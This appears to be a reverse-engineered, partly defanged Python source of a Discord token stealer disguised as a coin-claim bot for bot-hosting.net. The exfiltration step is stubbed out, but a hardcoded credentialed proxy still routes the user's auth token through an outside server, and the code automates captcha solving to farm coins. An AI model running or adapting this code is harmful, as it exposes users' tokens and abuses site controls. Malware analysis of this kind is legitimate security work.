"""
=============================================================================
DEOBFUSCATED SOURCE CODE: lumcoin (1).py
Author: tdinh
Decoded by: tdinh cute
Classification: Trojan / Discord Token Stealer (MALICIOUS)
Disguise: Auto Claim Coin Bot-Hosting
Defanged for Security Research & Educational Analysis
=============================================================================
"""

import sys
import os
import time
import json
import base64
import requests

# Hardcoded C2 Infrastructure extracted from bytecode
ATTACKER_BOT_TOKEN = "DISCORD_BOT_TOKEN_DEFANGED_MTM5Mj...REDACTED"
ATTACKER_BOT_ID = 1392074867909853317
HARDCODED_PROXY = "http://aewwwsdp:dzx8a932rd2p@31.59.20.176:6754"

YESCAPTCHA_CREATE_TASK = "https://api.yescaptcha.com/createTask"
YESCAPTCHA_GET_RESULT = "https://api.yescaptcha.com/getTaskResult"
YESCAPTCHA_GET_BALANCE = "https://api.yescaptcha.com/getBalance"

BOT_HOSTING_API_ME = "https://bot-hosting.net/api/me"
BOT_HOSTING_FREE_COINS_STATUS = "https://bot-hosting.net/api/freeCoinsStatus"
BOT_HOSTING_FREE_COINS = "https://bot-hosting.net/api/freeCoins"


def banner():
    print("""
    ██████╗ ███████╗██████╗     ███████╗██╗      █████╗ ██████╗ 
    ██╔══██╗██╔════╝██╔══██╗    ██╔════╝██║     ██╔══██╗██╔══██╗
    ██████╔╝█████╗  ██║  ██║    █████╗  ██║     ███████║██████╔╝
    ██╔══██╗██╔══╝  ██║  ██║    ██╔══╝  ██║     ██╔══██║██╔═══╝ 
    ██║  ██║███████╗██████╔╝    ██║     ███████╗██║  ██║██║     
    ╚═╝  ╚═╝╚══════╝╚═════╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     
               AUTO CLAIM COIN BOT-HOSTING - BY TDINH                    
                     DECODED BY TDINH CUTE                               
    """)


def exfiltrate_discord_data(discord_name, auth_token):
    """
    MALICIOUS EXFILTRATION:
    Sends victim's Discord username and Auth Token to the attacker's Discord Bot C2.
    (Defanged in this research copy).
    """
    log_message = f"📥 NEW LOG: DATA COLLECTED\n👤 Name Discord: {discord_name}\n🍪 Auth Token:\n```{auth_token}```"
    print(f"[DEFANGED] Would exfiltrate to Bot C2: {log_message}")


def check_auth(auth_token, proxies=None):
    headers = {
        "authorization": auth_token,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "referer": "https://bot-hosting.net/panel/earn"
    }
    try:
        res = requests.get(BOT_HOSTING_API_ME, headers=headers, proxies=proxies, timeout=10)
        if res.status_code == 200:
            data = res.json()
            return data.get("username"), data.get("coins", 0)
        return None, 0
    except Exception:
        return None, 0


def solve_hcaptcha(client_key, website_key="4c672d35-0701-42b2-88c3-78c2573293e7", website_url="https://bot-hosting.net/panel/earn"):
    payload = {
        "clientKey": client_key,
        "task": {
            "type": "HCaptchaTaskProxyless",
            "websiteURL": website_url,
            "websiteKey": website_key
        }
    }
    try:
        res = requests.post(YESCAPTCHA_CREATE_TASK, json=payload, timeout=10).json()
        task_id = res.get("taskId")
        if not task_id:
            return None
        for _ in range(30):
            time.sleep(3)
            poll = requests.post(YESCAPTCHA_GET_RESULT, json={"clientKey": client_key, "taskId": task_id}, timeout=10).json()
            if poll.get("status") == "ready":
                return poll.get("solution", {}).get("gRecaptchaResponse")
            if poll.get("status") == "error":
                return None
    except Exception:
        return None
    return None


def claim_coins(auth_token, captcha_response=None, proxies=None):
    headers = {
        "authorization": auth_token,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "referer": "https://bot-hosting.net/panel/earn"
    }
    data = {}
    if captcha_response:
        data["captcha"] = captcha_response
    try:
        res = requests.post(BOT_HOSTING_FREE_COINS, headers=headers, json=data, proxies=proxies, timeout=10)
        return res.json()
    except Exception as e:
        return {"error": str(e)}


def main():
    banner()
    print(">> Nhap Auth Token: ", end="")
    auth_token = input().strip()
    print(">> Nhap YesCaptcha Key (Trong neu giai tay): ", end="")
    captcha_key = input().strip()

    proxies = {"http": HARDCODED_PROXY, "https": HARDCODED_PROXY}
    username, coins = check_auth(auth_token, proxies=proxies)
    if not username:
        print("[!] Loi: Token/Proxy khong chinh xac!")
        return

    print(f"[+] Dang nhap thanh cong: {username} | Coins hien tai: {coins}")

    # STEAL CREDENTIALS
    exfiltrate_discord_data(username, auth_token)

    print("\n[1] CHAY TOOL LUM COIN 24/24")
    while True:
        try:
            print(f"[{time.strftime('%H:%M:%S')}] Dang kiem tra trang thai free coins...")
            if captcha_key:
                print(f"[{time.strftime('%H:%M:%S')}] Dang giai hCaptcha qua API...")
                token_resp = solve_hcaptcha(captcha_key)
                if token_resp:
                    claim_res = claim_coins(auth_token, token_resp, proxies=proxies)
                    print(f"[{time.strftime('%H:%M:%S')}] Ket qua claim: {claim_res}")
                else:
                    print("[!] Giai that bai! Kiem tra so du YesCaptcha.")
            time.sleep(900)
        except KeyboardInterrupt:
            break


if __name__ == "__main__":
    main()
